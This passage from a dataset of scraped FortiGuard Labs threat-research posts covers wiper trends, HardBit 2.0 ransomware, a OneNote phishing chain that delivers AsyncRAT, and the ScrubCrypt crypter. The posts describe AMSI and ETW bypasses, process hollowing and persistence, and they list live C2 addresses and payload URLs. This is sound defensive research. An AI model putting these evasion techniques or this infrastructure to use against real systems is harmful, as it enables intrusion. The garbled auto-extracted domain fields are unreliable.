people who were motivated by this trend to develop their own wipers. That's a very important shift to note, as it opens the door to more families, actors, and cybercrime in general. The expansion of wiper malware into other nations later in the year caused a 53% rise in wiper activity from Q3 to Q4 alone. While part of this activity may have been made possible by wiper software, which was initially created and propagated by nation-state actors in the context of the war, it is now being adopted by cybercriminal organizations and is moving outside of Europe. Given the magnitude of activity seen at the end of last year, the trajectory of wiper malware does not look to be slowing down anytime soon. And that means that any company could be a potential target. Already this year, wiper malware has become more and more prevalent, which is troubling. A bigger worry is that wiperware will become increasingly commoditized and become even more easily accessible to cybercriminals via CaaS. One of the major new concerns the security community as a whole is experiencing is the use of wipers in conjunction with other attack vectors. Wipers have the potential to devastate IT networks in both the public and private sectors around the world. And because they have been commoditized, wipers can massively damage networks. The cybersecurity community is always looking for the next shiny object that might aid in the fight against ransomware and wipers. Investment up front for mitigation of wipers is increasingly important, as initial damage can be exponentially costly for recovery. And it’s really tried-and-true tactics like these that win the day: Cybercriminals never pass up an opportunity. Threats are always increasing, whether it's a vulnerability, an attack, or a global conflict. Constantly keeping an eye on emerging trends like wiper malware use will help you anticipate what's coming and prioritize your resources for critical strategies you can implement to improve your cybersecurity posture, ensuring there are no gaps in your defense. This will improve your business’s ability to function even in the case of an unanticipated attack. Learn moreabout the latest cyber threat trends in the semiannual Global Threat Landscape Report from FortiGuard Labs. threat research,FortiGuards Labs,wiper malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/intel-on-wiper-malware",
      "scraped_at": "2025-07-20T13:58:55.195910",
      "indicators": {
        "ip_address": [],
        "domain": [],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.2773722627737227
    }
  },
  {
    "id": "Fortinet_4288",
    "source": "Fortinet",
    "title": "Ransomware Roundup — HardBit 2.0",
    "text": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers the HardBit 2.0 ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High HardBit ransomware dates to at least October 2022, with the current 2.0 version having been released shortly thereafter, in November 2022. As is commonplace now, HardBit leverages the “double extortion” technique of encrypting the files of a victim for ransom and then backstopping that action with a threat to release sensitive information and data if the ransom is not paid. HardBit 2.0 Ransomware Infection Vector Information on the infection vector used by this group is not currently available. However, it is not likely to differ greatly from other ransomware groups. HardBit 2.0 Ransomware Execution Upon execution, HardBit 2.0 terminates processes and services to slow the potential detection of its activities. It then encrypts files of interest and renames them to something random followed by [id-XXXX].[contact email].hardbit2. In each directory where files have been encrypted, an HTA file named “Help_me_for_Decrypt.hta” and a ransom note named “How To Restore Your Files.txt” are deposited. The ransom note contains an explanation of what has happened, a guarantee of recovery if payment is made, and e-mail addresses for contacting the attacker. Quite interestingly, there is no price specified in the ransom, ensuring a victim will have to contact the attacker to negotiate. Additionally, there is an entire paragraph on cyber insurance and the suggestion to undercut the provider by providing details of the insurance policy “anonymously”. This is (by their logic) a way to ensure their payment demands don’t exceed the maximum policy threshold so both the attacker and the policyholder get their payout. The HTA file is launched automatically once HardBit finishes encrypting the files on the host. It also provides a Tox ID with which to contact the attacker. Tox is an open-source, peer-to-peer instant messaging platform (https://en.wikipedia.org/wiki/Tox_(protocol)). It also has additional warnings indicating that if contact is not made within 48 hours, the ransom will double. On the Desktop, a JPEG image, “HARDBIT.jpg”, is dropped. This becomes the background for the compromised machine. The image reiterates that the victim should refer to the “Help_me_for_Decrypt.hta” and “How To Restore Your Files.txt” files deposited in their system. It also explains that files were also exfiltrated and explicitly threatens to release them for sale or onward publishing if contact is not forthcoming. Fortinet customers are already protected from this malware variant through FortiGuard’s Web Filtering, AntiVirus, and FortiEDR services, as follows: FortiGuard Labs detects known HardBit ransomware variants with the following AV signatures: The FortiGate, FortiMail, FortiClient, and FortiEDR solutions all support the FortiGuard AntiVirus service. As a result, customers with up-to-date protections are protected. File-based IOCs: 422e0e4e01c826c8a9f31cb3a3b37ba29fb4b4b8c4841e16194258435056d8a3 HardBit 2.0 a0138b24593483f50ae7656985b6d6cfe77f7676ba374026199ad49ad26f2992 HardBit 2.0 cb239d641cfa610b1eaf0ecd0f48c42dd147f547b888e4505297c4e9521d8afe HardBit 2.0 fafbe16c5646bf1776dd3ef62ba905b9b2cb0ee51043859a2f3cdda7dfe20d4c HardBit 2.0 Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release ofpersonally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU. S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. Ransomware Roundup,ransomware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/fortiguard-labs-ransomware-roundup",
      "scraped_at": "2025-07-20T13:59:03.413598",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ARDBIT",
          "iles",
          "n"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "a0138b24593483f50ae7656985b6d6cfe77f7676ba374026199ad49ad26f2992",
          "fafbe16c5646bf1776dd3ef62ba905b9b2cb0ee51043859a2f3cdda7dfe20d4c",
          "422e0e4e01c826c8a9f31cb3a3b37ba29fb4b4b8c4841e16194258435056d8a3",
          "cb239d641cfa610b1eaf0ecd0f48c42dd147f547b888e4505297c4e9521d8afe"
        ],
        "cve": [],
        "email": [],
        "url": [
          "https://en.wikipedia.org/wiki/Tox_"
        ]
      },
      "threat_score": 0.5402650356778798
    }
  },
  {
    "id": "Fortinet_75666",
    "source": "Fortinet",
    "title": "Microsoft OneNote File Being Leveraged by Phishing Campaigns to Spread Malware",
    "text": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Fully control the victim’s computerSeverity level:Critical A couple of phishing campaigns that recently caught FortiGuard Labs’ attention were found sending phishing emails with attached malicious Microsoft OneNote files to spread the AsyncRAT malware. As a cybersecurity researcher, I conducted an in-depth analysis of these phishing campaigns, tracing the entire process from the initial phishing email to the final deployment of AsyncRAT, which gains complete control of the victim's device. In this analysis, you will learn about the contents of this attack, such as what kind of phishing email starts the campaign, how a malicious Microsoft OneNote file is involved in the campaign, how it is leveraged to download and executemalicious fileson the victim’s device, the kinds of techniques that enable it to evade detection and analysis, and how the malware – AsyncRAT – communicates with its C2 server, including what control commands it supports to fully control the victim’s device. The following flowchart roughly describes the entire process of how the phishing campaign delivers and executes AsyncRAT: Figure 1.1 shows the captured phishing email in Outlook. As you can see, the email’s Subject has been marked as SPAM by our FortiMail service to alert the recipient to potential risks. The phishing email is disguised as an urgent shipment notification from a well-known delivery company. It asks the recipient to confirm whether a shipping address is correct by opening the attached Microsoft OneNote file, “SHIPPING_DOC.one”. Microsoft OneNote is a digital note-taking software provided as part of the Microsoft Office suite. It allows users to create notes that include texts, pictures, tables, and drawings. It also has a feature that allows users to insert file attachments into OneNote, including executable files (click menu “Insert” -> “File Attachment”). The left side of Figure 2.1 shows the OneNote file attached to the phishing email after being opened in the Microsoft OneNote program. It contains a button that lures the intended victim into clicking it to view the content. This button-like image conceals four identical BAT files that can be seen on the right side of Figure 2.1 when the button picture is moved out of the way. When double-clicking the button-like image, one of the inserted BAT files (viewn.bat) is executed. A batch file (. BAT) is a script containing a group of commands executed together by a command-line interpreter (like cmd.exe). The code in the viewn.bat file is similar to the following: Once the victim double-clicks the picture in the Microsoft OneNote program, a piece of Windows PowerShell script is also executed that downloads another BAT file called “Io.bat”. It is launched using the command “start Io.bat”. Figure 2.2 below shows the content of Io.bat in an editor. Io.bat’s primary task is similar to the previously described “viewn.bat”. It runs a Windows PowerShell script that downloads a ZIP archive file called “view.zip” onto the victim’s device. The script then decompresses an EXE file (view.exe) from the ZIP archive and executes it using the “start view.exe” command. Malware often employs complex methods to evade detection and analysis by security researchers. In this case, the downloaded view.exe is not the malware payload but a dropper of another batch file (“fresh.bat”). Figure 2.2 shows several screenshots of view.exe in a debugger. View.exe calls Windows-native APIs to load a resource called “CABINET” from the “RCData” folder in its RESOURCE section. It includes compressed data in a CAB file type. View.exe decompresses the resource data and saves it into the file “%temp%\\IXP004. TMP\\fresh.bat”. It then calls the API CreateProcessA() to run fresh.bat with the command “cmd /c fresh.bat”. Fresh.bat is obfuscated, as shown in Figure 2.4. Its commands are split into a branch of variables that are combined at the bottom before executing. The purpose of the combined commands is to copy Windows PowerShell.exe into the current folder and rename it as “fresh.bat.exe”. It then uses this to execute the piece of PowerShell code shown below. The PowerShell code is lightly obfuscated, like the reversed function names. However, it is easy to understand its code with the added comments. This segment of PowerShell code reads a chunk of strings that start with “:: “ from fresh.bat, a transformed PE file, as shown in Figure 2.4. (By the way, lines starting with “::” are comments in batch files (. BAT).) It then dynamically decodes, decrypts, and decompresses a PE file into memory and executes it by invoking its EntryPoint() function. Although it is fileless, it is originally named tmp72AF.tmp according to its compile information. Figure 2.5 shows a screenshot of the process tree, which explains the workflow from opening the OneNote file to running fresh.bat and fresh.bat.exe to executing the PowerShell code. It also shows the relationship between relevant processes. The fileless . Net PE file (origin name “tmp72AF.tmp”) is a malware loader program. It decrypts two executable modules from its . Net Resource section and launches them. 1. Anti-analysis In the Main() function, the malware calls the APIs CheckRemoteDebuggerPresent() and IsDebuggerPresent() to check if it is running in a debugger. It then checks the value of that assessment in Debugger. IsAttached. If either of them is “true”, the program exits immediately. Windows provides a system module called “amsi.dll“ (Antimalware Scan Interface) that has an export function called AmsiScanBuffer(). This can scan a data buffer for malware or malicious content. Tmp72AF.tmp can override the API function to have it always return a code of 0x80070057, which means \"the parameter is incorrect\". This override technique prevents the API AmsiScanBuffer() from detecting malware. To do this, it needs to call the API VirtualProtect() to set the memory of AmsiScanBuffer() to writable. Figure 3.1 illustrates a comparison between the original API AmsiScanBuffer() and the override API. 2. Decrypt two executable modules from the . Net Resource section As mentioned earlier, there are two modules in the . Net Resource section to be decrypted. Figure 3.2 displays the . Net Resource section with those two resources, “payload.exe” and “runpe.dll”. These two resources are encrypted and compressed using GZip compression. They are decrypted into the memory of the running processes (fresh.bat.exe, the copied PowerShell.exe). As their names suggest, the . Net program uses “runpe.dll” to launch “payload.exe”. The below figure shows when tmp72AF.tmp invokes the runpe. RunPE. ExecutePE() method of runpe.dll, where string3 is “runpe. RunPE”, string4 is “ExecutePE”, and array3 holds the data of the decrypted payload.exe. ExecutePE() launches payload.exe in a newly-created thread by invoking its entry point function. Payload.exe is a 64-bit console program that performs process hollowing to implant the AsyncRAT client into the target process notepad.exe. The trick of payload.exe is leveraging the “syscall” instruction every time it needs to call the undocumented APIs. In addition, all constant strings are encrypted and only decrypted before being referenced. This allows it to evade anti-virus software detection, creating challenges for security analysts. Below is a list of syscall ids and the corresponding APIs used by payload.exe. The following code snippet of “syscall” is used for calling the API NtOpenProcess(), where eax should be 0x26. To maintain persistence of the target process on the victim's device, payload.exe disguises the target process to appear as if it was started by the victim—which means its parent process is explorer.exe. To do this, it retrieves the process information of explorer.exe from the current process list by calling API NtQuerySystemInformation() using SystemProcessInformation as the value of the parameter SYSTEM_INFORMATION_CLASS. It then calls the API NtOpenProcess() to retrieve the process handle of explorer.exe. It uses this handle to set the PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute to explorer.exe using the API UpdateProcThreadAttribute(). This allows child processes to inherit this attribute. Meanwhile, that API function fills an attribute list with the inherited information from explorer.exe. As you can see in Figure 4.1, the malware was about to call the API CreateProcessW() with a full path of notepad.exe with the created flag of CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED and lpStartupInfo with the inherited explorer.exe information. After its creation, the notepad.exe process becomes a sub-process of explorer.exe as if it’s launched by the victim. Using Process Explorer software, we can see that the created notepad.exe process is now a sub-process of explorer.exe, and its status is “Suspended” (without “Running”), as shown in Figure 4.2. Subsequently, it leverages “syscall” to invoke APIs, such as NtAllocateVirtualMemory() and NtWriteVirtualMemory(), for allocating memory in the target process (notepad.exe). It transfers some data to the just-allocated memory containing the encrypted AsyncRAT client and a piece of ASM code in charge of decrypting and deploying the AsyncRAT client into the target process notepad.exe. It then proceeds to create an APC object and add it to the APC queue of a thread of notepad.exe by using the API NtQueueApcThread() with a thread function parameter pointing to the copied ASM code. Finally, the API NtResumeThread() is called to resume the execution of the previously suspended notepad.exe process. AsyncRAT is a Remote Access Trojan (RAT) that allows attackers to gain control of a victim's computer system. Its features include stealing sensitive data, monitoring user activity, and executing commands remotely on the infected device. AsyncRAT is written in C# language and runs in a . Net Framework environment. Since it is fileless in this phishing campaign, I needed to dump it from the notepad.exe process for deep analysis. Once AsyncRAT starts, it decrypts a group of setting values in its Main() function, as shown in Figure 5.1. The setting values for the captured AsyncRAT indicate: A crypto key was used to decrypt the following setting values: Once set, the AsyncRAT is ready to send information collected from the victim’s device to its C2 server and then wait for control commands from the C2 server to remotely control it. For secure communications, AsyncRAT uses the SSL protocol to deliver its packets. Below is a screenshot of the first packet that AsyncRAT sends to its C2 server before sending it over SSL. The data of the packet is saved in a unique format. All packets between AsyncRAT and its C2 server are in the same format, including value type, value name, and value. From the packet, I extracted the information in the following table as an example to explain the packet format. The value of “Packet” is the control command, where the “ClientInfo” command is used to send basic information about both the victim’s device and the AsyncRAT client to the C2 server, like a registration packet. AsyncRAT also supports many other control commands to control the victim’s machine. Most of the control commands AsyncRAT provides: \"blankscreen+\", \"blankscreen-\", \"botKiller\", \"BotKiller\", \"chat\", \"chat-\", \"chatExit\", \"chatWriteInput\", \"ClientInfo\", \"close\", \"disableDefedner\", \"dos\", \"dosAdd\", \"Error\", \"executeDotNetCode\", \"fileManager\", \"GetXmr\", \"keyLogger\", \"limeUSB\", \"Logs\", \"pcOptions\", \"Ping\", \"Ping!)\", \"plugin\", \"pong\", \"processManager\", \"Received\", \"remoteDesktop\", \"reportWindow\", \"reportWindow-\", \"restart\", \"savePlugin\", \"sendFile\", \"sendMemory\", \"sendMessage\", \"sendPlugin\", \"shell\", \"shellWriteInput\", \"socketDownload\", \"thumbnails\", \"thumbnailsStop\", \"torrent\", \"uac\", \"uninstall\", \"visitURL\", \"webcam\", \"xmr\", and more. Features that AsyncRAT supports: Backdoor Access: The attacker can remotely perform whatever activities they want within the infected system. Run Executable Files: The attacker can transfer any executable file and run it on the victim’s device. Credential Stealing: AsyncRAT can grab various user credentials from different applications, including Chrome, Firefox, Edge, and Internet Explorer. Remote Desktop Control: The attacker can achieve remote desktop control of the infected system. File Manager: AsyncRAT permits attackers to have full access to files on a targeted computer. They can move, delete, copy, or modify files. File Searcher: The attacker can search files on the infected system. The picture below shows how it starts the File Searcher feature on the AsyncRAT server. Process Manager: The attacker can check and kill running processes on the victim’s device. Keylogging: The malware has a keylogger function that can keep track of all keystrokes made on the victim’s device, monitoring both offline and online activities. DDoS Attacks: AsyncRAT can launch widespread DDoS attacks from multiple systems under its control to target specific websites. Audio Recording: The malware can unmute the microphone on infected machines to record audio. Webcam Control: AsyncRAT can enable the victim’s webcam to capture images and video. I have explained how the phishing campaign started with a SPAM email, how a Microsoft OneNote file is involved, and what BAT files are leveraged to download more malicious files (like Io.bat, view.zip). We also explored the anti-analysis techniques it uses to evade being detected and analyzed by security researchers. I elaborated on how a complicated strategy is used to protect its code, such as loading executable files from the PE Resource section, always keeping the key modules fileless, and creating a target notepad.exe process on behalf of explorer.exe. Finally, I demonstrated what the packet format looks like, what essential information AsyncRAT can collect from the victim’s device, and what control commands AsyncRAT supports to fully control the victim’s device. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, and AntiVirus services as follows: The downloading URLs and C2 server are rated as “Malicious Websites” by the FortiGuard Web Filtering service. FortiMail has recognized the phishing email as SPAM. FortiGuard Antivirus service detects the attached OneNote file, as well as the follow-up downloaded lo.bat file and view.zip files, with the AV signatures “MSOffice/Agent. OXZ!tr“, “BAT/Agent. OXZ!tr”, and “MSOffice/Agent. PLI!tr”. FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. We also suggest our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. https://transfer.sh/get/IKRQSd/view.zip https://transfer.sh/get/sxSJuL/lo.bat C2 Server List: 95.216.102.32:8808 Relevant Sample SHA-256: [SHIPPING_DOC.one] 305D7962894C83EBFCC863FE129180F20E6144F1F59D70971249D14E6D178FA4 DE5331B71DC535F75DADE1FBD042120FE9732FA851700A54D5C423B45145C929 66FBD626EAC4B285F093E5FBFF484DAA95D270E981EDA051836B5EE47EA7A01B Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. email phishing,phishing,malware analysis FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/microsoft-onenote-file-being-leveraged-by-phishing-campaigns-to-spread-malware",
      "scraped_at": "2025-07-20T13:59:12.492631",
      "indicators": {
        "ip_address": [
          "95.216.102.32"
        ],
        "domain": [
          "ransfer",
          "ayload",
          "owerShell",
          "iew",
          "otepad",
          "o",
          "md",
          "mp72AF",
          "msi",
          "unpe",
          "resh",
          "iewn",
          "xplorer"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "66FBD626EAC4B285F093E5FBFF484DAA95D270E981EDA051836B5EE47EA7A01B",
          "DE5331B71DC535F75DADE1FBD042120FE9732FA851700A54D5C423B45145C929",
          "305D7962894C83EBFCC863FE129180F20E6144F1F59D70971249D14E6D178FA4"
        ],
        "cve": [],
        "email": [],
        "url": [
          "https://transfer.sh/get/IKRQSd/view.zip",
          "https://transfer.sh/get/sxSJuL/lo.bat"
        ]
      },
      "threat_score": 0.38593481989708406
    }
  },
  {
    "id": "Fortinet_49463",
    "source": "Fortinet",
    "title": "Reduce, Reuse, Recycle: Bad Actors Practicing the Three Rs",
    "text": "FortiGuard Labs Threat Research Malware has a way of grabbing all the attention in the media and keeping companies on their toes. The world watched as wipers were deployed to Ukrainian organizations after the Russian invasion of Ukraine, which marked the beginning of a time of instability that included ransomware and InfoStealers, as well. Adding to the negative cybersecurity load of 2022, the contemporary version of ransomware celebrated its 10-year anniversary. And if that weren’t enough, our FortiGuard Labs researchers have seen that a cybercriminal, like any sensible businessperson, are big proponents of getting the most out of their resources. You might say they’re practicing the reduce, reuse, recycle principles, but instead of being focused on environmental concerns, they’re retrofitting code to enable more successful criminal outcomes. Apparently, it’s not just diamonds that are forever – so are certain strands of malware. In the second half of 2022,our researchers saw the resurgence of familiar names in the malware, wiper, and botnet space - including Emotet and GandCrab, to name a few. The top five ransomware families, out of a total of 99 detected, accounted for about 37% of all ransomware activity in the second half of 2022. The most prominent malware was GandCrab, a RaaS threat that surfaced in 2018. FortiGuard Labs also investigated a group of Emotet variations to assess their propensity for borrowing and recycling code. According to the research, Emotet has undergone significant diversification, with variants dividing into about six different \"species\" of malware. Not content to simply automate threats, cyber-attackers aggressively improve upon successful innovations. Cyber adversaries have an entrepreneurial spirit and are constantly seeking for ways to increase the value of current investments and knowledge in attack operations to increase their effectiveness and profitability. Reusing code allows hackers to build on previously successful results while iteratively improving their attacks and getting past defensive barriers. In fact, in our analysis of the most common malware for the second half of 2022, we saw that the bulk of the top ranks were occupied by malware that was more than a year old. Some of them—like Lazurus—have existed for more than 10 years and are pillars of the history of the internet. Along with reusing code, attackers are maximizing opportunities by using well-known threats and existing infrastructure. For instance, if we look at botnet threats by pervasiveness, many of the top botnets aren’t novel. Mirai and Gh0st. Rat has continued to dominate across all geographies, which isn’t surprising. Among the top five observed botnets, only RotaJakiro was created in the last couple of years. Although there’s a tendency to disregard more recent risks as history, businesses in all industries must maintain their vigilance. Such \"vintage\" botnets remain in wide circulation because they continue to be highly effective. Because there is a return on investment, clever hackers will continue to exploit current botnet infrastructure and transform it into increasingly persistent versions using highly specialized techniques. In particular, the manufacturing sector, Managed Security Service Providers (MSSP), and the telco/carrier sector were all major targets of Mirai in the second half of 2022. This demonstrates an intensive effort of criminals to target those sectors with tried-and-true techniques. It can be difficult for enterprises to keep up with constantly changing threats. The reuse of code and modularization made possible by a burgeoning Crime-as-a-Service ecosystem underscores the value of prompt security services that can help enterprises fend off threats with AI-powered, coordinated defense. Moreover, companies can achieve quicker detection and enforcement across the full attack surface if there is integration across all security devices, thereby lowering their overall risk posture. Beyond technology, cybersecurity strategy really comes down to people. It takes a global team effort with robust, trustworthy relationships and collaboration among cybersecurity participants across public and commercial organizations and sectors to successfully disrupt cybercriminal supply chains. Cyber awareness and hygiene training must be a cornerstone of any company – this must extend to all employees, not just those in IT or security functions. Anestimated 80% of organizationsreported last year that they’d suffered one or more breaches due to a lack of cybersecurity skills and awareness. The latter half of 2022 was interesting, to say the least. Understanding the trends from this period will help you better understand how to keep your companies operating safely. According to what we have observed over the past six months, we cannot dismiss older threats. They are still actively evolving and searching for both unpatched places and fresh vulnerabilities that will enable them to spread. Companies that use the above information and best practices will be better prepared to face what’s next on the threat horizon. Learn moreabout the latest cyber threat trends in the semiannual Global Threat Landscape Report from FortiGuard Labs. Cybercriminals,trends,malware,Cyber Awareness FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/bad-actors-resurrecting-old-tactics",
      "scraped_at": "2025-07-20T13:59:21.168252",
      "indicators": {
        "ip_address": [],
        "domain": [],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.29702970297029707
    }
  },
  {
    "id": "Fortinet_27655",
    "source": "Fortinet",
    "title": "Old Cyber Gang Uses New Crypter – ScrubCrypt",
    "text": "FortiGuard Labs Threat Research Affected platforms:WindowsImpacted parties:Any organizationImpact:Cryptojacks vulnerable systemsSeverity level:Critical Between January and February 2023, FortiGuard Labs observed a payload targeting an exploitable Oracle Weblogic Server in a specific URI. This payload extracts ScrubCrypt, which obfuscates and encrypts applications and makes them able to dodge security programs. It already has an updated version, and the seller’s webpage (Figure 1) guarantees that it can bypass Windows Defender and provide anti-debug and some bypass functions. We analyzed the malware injected into a victim’s system and, as part of our analysis, identified the threat actor as 8220 Gang using collected indicators. This mining group first appeared in 2017. The name “8220” comes from its original use of port 8220 for network communications. In this article, we will elaborate on the details of ScrubCrypt and other malware delivered by this crypter in the past. Based on our observations over the past two months, these attacks originate from 163[.]123[.]142[.]210 and 185[.]17[.]0[.]19. The attackers have targeted an HTTP URI, “wls-wsat/CoordinatorPortType,” which belongs to an Oracle Weblogic server. The corresponding traffic capture is shown in Figure 2. The attack attempts to download a PowerShell named “bypass.ps1”. The partial PowerShell script, “bypass.ps1,” shown in Figure 3, has had its main code and strings encoded to make it harder to be detected by AntiVirus solutions. After three rounds of adding constants, reversing, and Based64 decoding, we finally uncovered clear text. The first variable, “$c”, contains ScrubCrypt. The detail of this variable will be discussed in the next section. The rest of the variables, from “$d” to “$f”, are for AMSI and ETW evasion, which is executed by “iex” at the end of the attack. After decoding “$c”, we find the script for the next step, shown in Figure 4. It has another Base64-encoded code saved in the victim’s temp folder with the filename “OracleUpdate.bat” to masquerade as a normal system file. Once the fake “update” file is decoded and saved, it executes with the Windows style “hidden” to silently load ScrubCrypt. ScrubCrypt is a crypter used to secure applications with a unique BAT packing method. The batch file is shown in Figure 5. The encrypted data at the top can be split into four parts using backslash “\\”. The final two parts are the key and iv for AES CBC decryption. After Base64 decode, AES decryption, and unzip, we can finally see the code. The organized code in Figure 6 is a typical . NET Reflective Injection. In the last two lines of the code, the variable “$BmoFi” disables Event Tracing for Windows (ETW) by patching the EtwEventWrite function with 0xC3 (ret), and “$BbIpF” is used to invoke a . NET named “ScrubCrypt” for the final payload, shown in Figure 7. The . NET code first modifies the extension as null, checks to see if a debugger is attached, and checks the system’s operating system version to decide whether or not to proceed. It then gets the process ID to establish a melting file (self-delete) after execution, shown in Figure 8. Then, it determines whether the current user belongs to the Windows user group “BUILTIN\\Administrators” (RID: 0x220). If the user is not in that specific group, it decodes the “UAC” data from the “Resources” section and saves it to “C:\\Windows\\system32\\perfmon.exe”. The DLL file is shown in Figure 9. It is used to retrieve username information from the compromised endpoint. It then decodes the PowerShell command:“cmd /c timeout /t 3 /nobreak & “C:\\Windows\\System32\\perfmon.exe””to pause the command processor for three seconds, ignore any keystrokes, and execute the DLL. Next, it enumerates the driver in the system to bypass scans from Windows Defender using the command in Figure 10. For persistence, it grabs registry values from “Run” and “RunOnce” to determine if this . NET file is already set. If not, it saves the . NET file to a “Roaming” folder named “BSLkE.bat” and adds a registry value to run a VBS file with the content shown in Figure 11. Finally, it decodes data “P” from the “Resources” section using the XOR key in Figure 12 and unzips it. Then it loads the decoded data named “miner” in memory and invokes the payload, as shown in Figure 13. We collected several ScrubCrypt samples in February, and each payload is a little different. On 2/14, ScrubCrypt loads “miner” and invokes the process “explorer.exe” to start the miner process to server 45[.]142[.]122[.]11:8080, shown in Figures 14 and 15. This IP address and wallet were used for the 8220 Gang attack in January 2023. On 2/15, ScrubCrypt extracted “bat”, which unzipped its array data and used “InvokeMember” to execute “Eoengmvsg.dll”, shown in Figure 16. It decodes the three C2 servers and three port numbers shown in Figure 17. Once that victim device receives the C2 server’s packets, it downloads another three files from 79[.]137[.]203[.]156, shown in Figure 18. The first, “miner.bat”, is a ScrubCrypt BAT file. The other two files are compressed PE files: “plugin_3.dll” and “plugin_4.dll” (Figure 19). They exhibit behavior similar to that described inthis previous article. On 2/16, ScrubCrypt loaded a module also named “bat’, as shown in Figure 20, but the data for its unzip is from its “Resources” section. It communicates with the same C2 server, and downloads two files from 163[.]123[.]142[.]210. These files are also compressed PE files named “plugin_3.dll” and “plugin_4.dll”. They are identical to the files from 2/15 and start crypto miner activity using the same configuration, as shown in Figure 21. The crypto wallet address,46E9UkTFqALXNh2mSbA7WGDoa2i6h4WVgUgPVdT9ZdtweLRvAhWmbvuY1dhEmfjHbsavKXo3eGf5ZRb4qJzFXLVHGYH4moQ, and the server IP address used in Monero miner have all been used by the 8220 Gang in the past. It’s why we believe the whole attack was launched by this threat actor, although the port number used is no longer 8220. 8220 Gang is a well-known miner group that usually leverages public file-sharing websites and targets system vulnerabilities to infiltrate a victim’s environment. Within a very short time, it has evolved to use a newer crypter variant, “ScrubCrypt.” Below is its complete attack chain. ScrubCrypt includes evasion and encryption functions, making it harder for anti-virus programs to detect 8220 Gang activity. Users should be aware of this updated crypter and keep their systems patched. The malware described in this report are detected and blocked by FortiGuard Antivirus as: PowerShell/Agent. YX!tr BAT/ScrubCrypt. A!tr MSIL/ScrubCrypt. AHRI!tr MSIL/Agent. DUD!tr MSIL/Agent. AHZU!tr MSIL/GenKryptik. FYKQ!tr MSIL/GenKryptik. GGHT!tr MSIL/Agent. OBB!tr.dldr Riskware/CoinMiner The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR, and the Fortinet AntiVirus engine is a part of each of those solutions. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service blocks the malicious URL and IP address. If you think this or any other cybersecurity threat has impacted your organization, contact ourGlobal 